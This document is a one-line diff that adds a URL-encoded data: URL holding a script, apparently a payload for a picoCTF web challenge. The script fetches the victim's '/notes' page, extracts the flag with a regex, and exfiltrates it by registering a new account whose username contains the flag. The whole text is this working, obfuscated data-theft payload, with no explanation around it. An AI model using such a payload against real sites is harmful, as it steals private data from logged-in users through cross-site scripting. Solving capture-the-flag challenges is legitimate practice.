@@ -1,0 +1,1 @@
+data:text/html,%3Cscript%3Efetch%28%27/notes%27%29.then%28r%3D%3Er.text%28%29%29.then%28h%3D%3E%7Blet%20m%3Dh.match%28/picoCTF%5C%7B%5B%5E%7D%5D%2B%5C%7D/%29%3Bif%28m%29fetch%28%27/register%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParams%28%7Busername%3A%27xx%27%2Bm%5B0%5D%2Cpassword%3A%27x%27%7D%29%7D%29%7D%29%3C/script%3E%0A
